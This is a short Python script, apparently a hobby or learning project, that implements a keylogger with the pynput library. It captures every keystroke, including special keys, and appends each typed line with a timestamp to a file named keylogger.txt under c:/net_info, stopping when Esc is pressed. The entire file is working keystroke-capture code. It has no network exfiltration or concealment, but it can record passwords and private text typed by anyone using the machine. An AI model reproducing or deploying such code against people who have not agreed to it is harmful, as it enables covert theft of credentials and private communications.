from pynput.keyboard import Key, Listener
import logging

log_dir = 'c:/net_info'
logging.basicConfig(filename=(log_dir + "/keylogger.txt"),
                    level=logging.DEBUG, format='["%(asctime)s"] %(message)s')

tmp_str = ''

def on_press(key):
    global tmp_str
    #일반 문자
    print(key)
    if key != "'":
        inputKey = str(key).replace("'", "")
    else:
        print(key)
        inputKey = "\'"
        print(inputKey)
    print(inputKey)

    try:
        key.char
    except AttributeError:
        inputKey = "<[" +(inputKey.replace("Key.", "")) + "]>"
    tmp_str = tmp_str+(inputKey)
    # print(inputKey)
    if key == Key.enter:
        logging.info(f"{tmp_str}")
        tmp_str=''
    if key == Key.esc:
        return False


with Listener(on_press=on_press) as listener:
    listener.join()